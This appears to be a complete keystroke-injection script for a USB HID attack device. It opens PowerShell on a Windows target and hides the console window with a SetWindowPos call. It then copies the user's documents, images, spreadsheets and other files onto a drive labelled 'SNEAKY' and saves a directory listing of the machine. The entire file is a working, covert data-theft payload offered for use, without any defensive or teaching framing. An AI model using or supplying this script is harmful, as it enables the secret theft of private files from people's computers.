layout('us') //set layout us
hide=true; // set to true to hide the console window on the target
tree=true;
typingSpeed(0,0);
waitLED(ANY_OR_NONE, 5000); 
press("GUI r") // windows + r
delay(500) 
type("powershell\n") // write powershell and press "enter"
delay(500)

if (hide) {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
	press("ENTER")
}
	
delay(500)

type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name\n")

var filetypes = ["jpg", "txt" ,"pdf", "doc", "docx", "ppt", "pptx", "xls", "xlsx", "png", "html"]

for (var i = 0; i < filetypes.length; i++) {
    type("copy */*/*." + filetypes[i] + " $usbpath.name\n")
}

if(tree){
	type('mkdir "$($usbPath.name)trees"\n')
	type('tree /f > "$($usbPath.name)trees/tree.txt"\n')
}

type("exit\n")  //exit